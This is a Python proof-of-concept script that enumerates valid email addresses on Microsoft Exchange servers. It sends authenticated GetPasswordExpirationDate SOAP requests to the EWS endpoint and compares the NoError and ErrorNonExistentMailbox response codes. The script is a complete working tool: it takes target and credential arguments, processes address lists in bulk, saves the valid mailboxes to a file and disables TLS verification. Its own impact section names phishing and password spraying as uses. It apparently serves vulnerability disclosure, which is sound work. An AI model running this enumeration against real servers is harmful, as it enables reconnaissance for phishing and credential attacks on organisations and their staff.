#!/usr/bin/env python3
"""
PoC: User Enumeration via GetPasswordExpirationDate Response Codes
Demonstrates that an attacker can enumerate valid email addresses by analyzing
different response codes (NoError vs ErrorNonExistentMailbox).

Target: Microsoft Exchange Server (EWS API)
Severity: MEDIUM
CVSS: 5.3 (AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N)
"""

import requests
from requests.auth import HTTPBasicAuth
import xml.etree.ElementTree as ET
from urllib3.exceptions import InsecureRequestWarning
from datetime import datetime
import argparse
import sys
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Argument parser
parser = argparse.ArgumentParser(
    description='User Enumeration via GetPasswordExpirationDate',
    formatter_class=argparse.RawDescriptionHelpFormatter,
    epilog="""
Examples:
  %(prog)s -t https://DOMAIN/EWS/Exchange.asmx -d DOMAIN -u login -p 'pass' -f users.txt
  %(prog)s -t https://DOMAIN/EWS/Exchange.asmx -d DOMAIN -u login -p 'pass' -e user@domain.com
"""
)

parser.add_argument('-t', '--target', required=True, help='EWS URL (e.g., https://mail.example.com/EWS/Exchange.asmx)')
parser.add_argument('-d', '--domain', required=True, help='Domain name (e.g., DOMAIN)')
parser.add_argument('-u', '--username', required=True, help='Username (without domain prefix)')
parser.add_argument('-p', '--password', required=True, help='Password')
parser.add_argument('-f', '--file', help='File with email addresses (one per line)')
parser.add_argument('-e', '--email', help='Single email address to test')
parser.add_argument('-a', '--auth', choices=['ntlm', 'basic'], default='basic', help='Authentication method (default: basic)')
parser.add_argument('-o', '--output', help='Output file for valid emails')

args = parser.parse_args()

# Validate input
if not args.file and not args.email:
    print("[!] Error: You must specify either --file or --email")
    sys.exit(1)

# Setup auth
if args.auth == 'basic':
    auth = HTTPBasicAuth(f'{args.domain}\\{args.username}', args.password)
else:
    from requests_ntlm import HttpNtlmAuth
    auth = HttpNtlmAuth(f'{args.domain}\\{args.username}', args.password)

print("="*80)
print("PoC: User Enumeration via GetPasswordExpirationDate")
print("Microsoft Exchange Server - EWS API")
print("="*80)
print(f"\nAuthenticated as: {args.domain}\\{args.username}")
print(f"Target: {args.target}")
print(f"Test started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
print("\n" + "="*80)

# Load test users
test_users = []
if args.file:
    try:
        with open(args.file, 'r') as f:
            test_users = [line.strip() for line in f if line.strip() and '@' in line]
        print(f"[+] Loaded {len(test_users)} emails from {args.file}")
    except Exception as e:
        print(f"[!] Error reading file: {e}")
        sys.exit(1)
elif args.email:
    test_users = [args.email]
    print(f"[+] Testing single email: {args.email}")

if not test_users:
    print("[!] Error: No valid email addresses to test")
    sys.exit(1)

results = {
    "valid": [],
    "invalid": [],
    "errors": []
}

print("\n[*] Testing user enumeration via response code analysis...\n")
print(f"{'EMAIL':<50} | {'RESPONSE CODE':<30} | {'STATUS'}")
print("-" * 95)

for email in test_users:
    soap = f"""<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
               xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2013" />
  </soap:Header>
  <soap:Body>
    <m:GetPasswordExpirationDate>
      <m:MailboxSmtpAddress>{email}</m:MailboxSmtpAddress>
    </m:GetPasswordExpirationDate>
  </soap:Body>
</soap:Envelope>"""

    try:
        resp = requests.post(args.target, data=soap, 
                           headers={'Content-Type': 'text/xml; charset=utf-8'}, 
                           auth=auth, verify=False, timeout=10)
        
        if resp.status_code == 200:
            root = ET.fromstring(resp.text)
            
            response_code = None
            for elem in root.iter():
                tag = elem.tag.split('}')[-1]
                if tag == 'ResponseCode':
                    response_code = elem.text
                    break
            
            if response_code == 'NoError':
                results["valid"].append(email)
                status = "✓ USER EXISTS"
                print(f"{email:<50} | {response_code:<30} | {status}")
            elif response_code == 'ErrorNonExistentMailbox':
                results["invalid"].append(email)
                status = "✗ USER DOES NOT EXIST"
                print(f"{email:<50} | {response_code:<30} | {status}")
            else:
                results["errors"].append({"email": email, "code": response_code})
                status = f"? OTHER"
                print(f"{email:<50} | {response_code:<30} | {status}")
        else:
            results["errors"].append({"email": email, "code": f"HTTP {resp.status_code}"})
            print(f"{email:<50} | {'HTTP ' + str(resp.status_code):<30} | ERROR")
            
    except Exception as e:
        results["errors"].append({"email": email, "code": str(e)[:30]})
        print(f"{email:<50} | {str(e)[:30]:<30} | EXCEPTION")

# Summary
print("\n" + "="*80)
print("SUMMARY")
print("="*80)
print(f"Total users tested: {len(test_users)}")
print(f"Valid users identified: {len(results['valid'])}")
print(f"Invalid users identified: {len(results['invalid'])}")
print(f"Errors: {len(results['errors'])}")

if results["valid"]:
    print("\n" + "="*80)
    print("VALID EMAILS (USER EXISTS)")
    print("="*80)
    for email in results["valid"]:
        print(f"  ✓ {email}")

if results["errors"]:
    print("\n" + "="*80)
    print("ERRORS")
    print("="*80)
    for error in results["errors"][:10]:  # Show first 10
        print(f"  ! {error['email']}: {error['code']}")
    if len(results["errors"]) > 10:
        print(f"  ... and {len(results['errors']) - 10} more errors")

# Save valid emails to file
if args.output and results["valid"]:
    try:
        with open(args.output, 'w') as f:
            f.write(f"# Valid emails found via GetPasswordExpirationDate enumeration\n")
            f.write(f"# Target: {args.target}\n")
            f.write(f"# Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"# Total: {len(results['valid'])} valid emails\n")
            f.write("#\n")
            for email in results["valid"]:
                f.write(f"{email}\n")
        print(f"\n[+] Valid emails saved to: {args.output}")
    except Exception as e:
        print(f"\n[!] Error saving file: {e}")

print("\n" + "="*80)
print("IMPACT:")
print("  - Response code differences allow enumeration of valid email addresses")
print("  - Can be used for targeted phishing or password spraying attacks")
print("  - No rate limiting observed in test environment")
print("="*80)
print(f"\nTest completed: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
